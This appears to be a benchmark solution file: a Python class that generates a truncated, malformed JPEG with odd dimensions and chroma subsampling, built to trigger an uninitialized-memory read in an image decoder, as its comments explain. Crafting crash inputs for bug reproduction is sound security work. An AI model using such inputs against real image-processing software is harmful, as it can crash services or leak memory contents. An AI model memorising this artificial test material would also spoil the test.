import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Helper to create JPEG segments
        def chunk(tag, payload):
            return b'\xff' + tag + struct.pack(">H", len(payload) + 2) + payload

        # SOI (Start of Image)
        data = b'\xff\xd8'

        # APP0 (JFIF Header)
        data += chunk(b'\xe0', b'JFIF\x00\x01\x01\x01\x00\x60\x00\x60\x00\x00')

        # DQT (Define Quantization Tables)
        # Define two tables (ID 0 and ID 1), filled with 1s for simplicity
        # Precision 0 (8-bit), ID 0
        dqt = b'\x00' + b'\x01' * 64
        # Precision 0, ID 1
        dqt += b'\x01' + b'\x01' * 64
        data += chunk(b'\xdb', dqt)

        # SOF0 (Start of Frame 0 - Baseline DCT)
        # Use odd dimensions (131x131) to force partial MCUs at the edges.
        # This is often where uninitialized memory issues occur if the buffer
        # isn't zeroed (the vulnerability condition).
        # Subsampling: 4:2:0 (Y=2x2, Cb=1x1, Cr=1x1)
        height = 131
        width = 131
        sof = struct.pack(">BHHB", 8, height, width, 3)
        sof += b'\x01\x22\x00' # Component 1 (Y):  2x2 sampling, QT 0
        sof += b'\x02\x11\x01' # Component 2 (Cb): 1x1 sampling, QT 1
        sof += b'\x03\x11\x01' # Component 3 (Cr): 1x1 sampling, QT 1
        data += chunk(b'\xc0', sof)

        # DHT (Define Huffman Tables)
        # We define standard tables to ensure the headers are valid and decoding starts.
        
        # Table 0 (DC Luminance)
        dht = b'\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
        dht += bytes(range(12)) # Symbols
        
        # Table 1 (AC Luminance) - ID 0x10
        dht += b'\x10\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01\x7d'
        dht += bytes(range(1, 163)) # Symbols match count (162 bytes)

        # Table 2 (DC Chrominance) - ID 0x01
        dht += b'\x01\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
        dht += bytes(range(12))

        # Table 3 (AC Chrominance) - ID 0x11
        dht += b'\x11\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01\x7d'
        dht += bytes(range(1, 163))
        
        data += chunk(b'\xc4', dht)

        # SOS (Start of Scan)
        # Scan components 1, 2, 3
        sos = b'\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00'
        data += chunk(b'\xda', sos)

        # Entropy Data (Truncated)
        # Provide minimal data (just zeros) and truncate immediately.
        # This forces the decoder to abort early. If the transformation logic
        # accesses the destination buffer (e.g. for edge processing) assuming 
        # it was initialized/populated, it triggers the uninitialized value error (MSan).
        data += b'\x00' * 32

        # No EOI marker
        
        return data